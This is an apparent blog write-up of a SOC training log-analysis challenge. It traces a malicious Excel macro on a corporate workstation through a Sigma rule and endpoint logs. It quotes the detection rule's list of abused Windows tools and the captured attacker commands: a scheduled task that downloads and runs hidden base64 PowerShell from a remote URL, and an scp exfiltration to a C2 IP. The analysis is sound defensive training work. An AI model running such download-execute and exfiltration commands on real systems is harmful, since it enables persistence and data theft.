---
title: Log Analysis - Challenge 2
date: 2025-05-08 11:35:00 +550
categories: [Digital Forensics, Log Analysis]
tags: [Digital Forensics]
---



Preface
> The log data is from the SOC100 course by Level Effect. This is the documentation of my thought process and analysis of
> the log analysis challenges from this course. 


Scenario
> On `Jan 12, 2025 @ 06:46:00Z` our SOC was alerted on our `Suspicious MS Office Child Process` 
> Sigma rule for user `GOODCORP\Gooduser` on host  `WS1.goodcorp.local`.

We are also given the sigma rule that was triggered.

```
(process.parent.name:

(EQNEDT32.EXE OR EXCEL.EXE OR MSACCESS.EXE OR MSPUB.exe OR ONENOTE.EXE OR POWERPNT.exe OR VISIO.exe OR WINWORD.EXE OR wordpad.exe OR wordview.exe)

) 

AND

(process.name:

(bash.exe OR bitsadmin.exe OR certutil.exe OR cmd.exe OR control.exe OR cscript.exe OR curl.exe OR installutil.exe OR javaw.exe OR msdt.exe OR mshta.exe OR msiexec.exe OR powershell.exe OR pwsh.exe OR regasm.exe OR regsvcs.exe OR regsvr32.exe OR rundll32.exe OR schtasks.exe OR svchost.exe OR wmic.exe OR wscript.exe)

)

```

After selecting the index, set the time range to `Jan 12, 2025 @ 06:35:00.000` -> `Jan 12, 2025 @ 07:05:00.000`.

Filtering for the first part of the triggered Sigma rule.

```
process.parent.name: (EQNEDT32.EXE OR EXCEL.EXE OR MSACCESS.EXE OR MSPUB.exe OR ONENOTE.EXE OR POWERPNT.exe OR VISIO.exe OR WINWORD.EXE OR wordpad.exe OR wordview.exe)
```

![Pasted image 20250308100132.png](/assets/img/Pasted%20image%2020250308100132.png)

We find that three alerts have been triggered for command execution with the parent process of `EXCEL.EXE`.
Expanding the logs we can see that the parent process of excel ran a file called `HSA Balance Update.xlsm` that spawned the `cmd` process.

![Pasted image 20250308104202.png](/assets/img/Pasted%20image%2020250308104202.png)

Analyzing the command run uncovers that it is creating a scheduled task to run a file called `1.css` every 10 minutes. 

```Cmd
cmd /Q /c schtasks /Create /TN "7655603E83CC" /TR "cmd /c start /min powershell.exe -win hidd -nop -ep bypass -c \"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((New-Object 
Net.Webclient).downloadstring(\\\"https://ibarblkacoiwlkese.s3.amazonaws.com/1.css\\\"))))\"" /SC MINUTE /MO 10 /F
```

So now we can update our filters to look for the execution of the scheduled task. Filter for `cmd.exe`  that will be run by the scheduled task.

![Pasted image 20250308100409.png](/assets/img/Pasted%20image%2020250308100409.png)

Since we know that the excel file was run at 6:46, the scheduled task would have ran at 6:56.

Time: Jan 12, 2025 @ 06:46:03
Process ID: 11244

![Pasted image 20250308100423.png](/assets/img/Pasted%20image%2020250308100423.png)

Time: Jan 12, 2025 @ 06:56:01
Process ID: 2088

![Pasted image 20250308100514.png](/assets/img/Pasted%20image%2020250308100514.png)


Now that we have found the process that's being run we can filter for it's PID as the parent PID to see what commands the file is running.

![Pasted image 20250308101034.png](/assets/img/Pasted%20image%2020250308101034.png)



![Pasted image 20250308101906.png](/assets/img/Pasted%20image%2020250308101906.png)

```PowerShell
powershell.exe  -win hidd -nop -ep bypass -c "IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring(\"https://ibarblkacoiwlkese.s3.amazonaws.com/1.css\"))))"
```

The PowerShell script is downloading some other executables like SFTP, SSH and SCP all most likely being used for persistence and data exfiltration.

![Pasted image 20250308102045.png](/assets/img/Pasted%20image%2020250308102045.png)


Since the scheduled task is spawning a PowerShell process we can filter for the PID of that process.

![Pasted image 20250308102305.png](/assets/img/Pasted%20image%2020250308102305.png)


![Pasted image 20250308103110.png](/assets/img/Pasted%20image%2020250308103110.png)

```
"C:\ProgramData\OpenSSH-Win64\scp.exe" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i C:\ProgramData\OpenSSH-Win64\out_s -P 443 C:\ProgramData\OpenSSH-Win64\sysinfo.zip fence@159.89.237.228:/home/fence/collections/
```

Attacker C2 server IP: 159.89.237.228
Private Key: `out_s`
Data Exfil: sysinfo.zip

The script is running the `scp.exe` to exfiltrate a file called sysinfo.zip to the attackers C2 server. It is using the private key `out_s` specified
using the `-i` flag in the SCP command.

